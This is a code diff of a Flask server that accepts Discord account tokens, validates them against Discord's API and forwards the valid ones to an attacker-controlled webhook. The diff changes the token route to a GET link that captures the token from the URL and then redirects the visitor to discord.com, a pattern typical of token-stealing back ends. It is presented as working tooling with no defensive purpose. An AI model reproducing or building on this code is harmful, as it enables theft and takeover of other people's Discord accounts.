@@ -1,12 +1,13 @@
 from dhooks import Webhook
 import os
-from flask import Flask, request
+from flask import Flask, redirect
 import requests
+
 
 def check_discord_token(token):
     url = "https://discord.com/api/v10/users/@me"
     headers = {
-        "Authorization": f"Bearer {token}"
+        "Authorization": f"{token}"
     }
     
     response = requests.get(url, headers=headers)
@@ -19,17 +20,11 @@ def check_discord_token(token):
 e = os.getenv('DISCORD_URL')
 app = Flask(__name__)
 hook = Webhook(e)
-
-@app.route('/token', methods=['POST'])
-def index():
-    token = request.form.get('token')
-    if not token:
-        return 'Token is required', 400
-    
-    if check_discord_token(token) == "True":
-        hook.send(token)
-    
-    return 'Token processed successfully', 200
+@app.route('/token/<string:token>')
+def index(token):
+  if check_discord_token(token) == "True":
+      hook.send(token)
+  return redirect("discord.com")
 
 @app.route('/update')
 def update():
@@ -44,4 +39,4 @@ def update():
         return f'Failed to download the update: {e}', 500
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=81)
+  app.run(host='0.0.0.0', port=81)
